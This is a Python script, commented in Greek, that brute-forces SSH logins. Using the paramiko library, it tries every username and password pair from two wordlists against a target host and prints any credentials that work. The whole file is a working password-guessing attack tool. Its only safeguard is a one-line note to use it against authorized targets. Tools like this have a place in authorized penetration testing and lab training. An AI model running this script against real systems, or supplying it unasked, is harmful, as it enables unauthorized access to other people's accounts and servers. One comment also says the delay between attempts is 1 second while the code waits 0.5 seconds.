import paramiko
import sys
import argparse
import socket
from colorama import Fore, Style, init
import time

init(autoreset=True)

# --- 1. Argparse Parser ---
def create_parser():
    parser = argparse.ArgumentParser(
        description=f"{Fore.RED}SSH/FTP Brute-Force Automation Tool. Use against targets you are authorized to test.",
        epilog="Example: python3 ssh_brute.py -t 10.0.2.4 -u userlist.txt -p passlist.txt"
    )
    parser.add_argument('-t', '--target', required=True, help='Target IP address or domain.')
    parser.add_argument('-u', '--users', required=True, help='Path to the user list file (one username per line).')
    parser.add_argument('-p', '--passwords', required=True, help='Path to the password list file (one password per line).')
    return parser

# --- 2. Λογική Brute Force ---
def attempt_ssh_login(hostname, username, password):
    # Συνάρτηση που προσπαθεί να συνδεθεί με το Paramiko
    try:
        # Δημιουργία SSH Client
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        # Προσπάθεια σύνδεσης
        client.connect(hostname=hostname, 
                       username=username, 
                       password=password, 
                       timeout=3, 
                       auth_timeout=3,
                       banner_timeout=3)
                       
        # Αν περάσει το connect, η σύνδεση είναι επιτυχής
        return True
    
    except paramiko.AuthenticationException:
        # Λάθος κωδικός
        return False
        
    except socket.error as e:
        # Άλλο σφάλμα (π.χ. Server Down, Connection Refused)
        print(f"{Fore.YELLOW}⚠️ Error connecting to {hostname}: {e}")
        return None
        
    except Exception as e:
        # Άλλο σφάλμα
        print(f"{Fore.YELLOW}⚠️ General Error: {e}")
        return None
        
    finally:
        if 'client' in locals():
             client.close()

# --- 3. Κύρια Συνάρτηση (Main) ---
def main():
    parser = create_parser()
    args = parser.parse_args()
    
    hostname = args.target
    userlist_path = args.users
    passlist_path = args.passwords
    
    # 1. Φόρτωση Λιστών
    try:
        with open(userlist_path, 'r') as f:
            usernames = [line.strip() for line in f if line.strip()]
        
        with open(passlist_path, 'r') as f:
            passwords = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"{Fore.RED}🚨 Error: User or Password file not found!")
        sys.exit(1)
        
    print(f"{Fore.CYAN}--- Starting Brute-Force Attack on {hostname} ---")
    print(f"{Fore.CYAN}Users to test: {len(usernames)} | Passwords to test: {len(passwords)}")
    
    # 2. Ο Βρόχος Επίθεσης (Nested Loops)
    for username in usernames:
        for password in passwords:
            print(f"[{Fore.YELLOW}Testing{Style.RESET_ALL}] {username}:{password}")
            
            # Καλούμε τη λογική σύνδεσης
            result = attempt_ssh_login(hostname, username, password)
            
            if result is True:
                # Επιτυχής Σύνδεση
                print(f"{Fore.GREEN}✅ SUCCESS! Valid Credentials Found: {username}:{password}")
                # Έχουμε βρει τον κωδικό, τερματίζουμε
                return 
            
            elif result is None:
                # Σφάλμα σύνδεσης (π.χ., ο στόχος έπεσε ή SSH Exception)
                pass 
            
            # ➡️ ΤΟ time.sleep(1) ΠΡΕΠΕΙ ΝΑ ΕΙΝΑΙ ΣΕ ΑΥΤΗ ΤΗΝ ΕΣΟΧΗ!
            # Περιμένουμε 1 δευτερόλεπτο πριν την επόμενη προσπάθεια
            time.sleep(0.5)

    print(f"{Fore.RED}--- Brute-Force finished. No valid credentials found. ---")


if __name__ == "__main__":
    main()
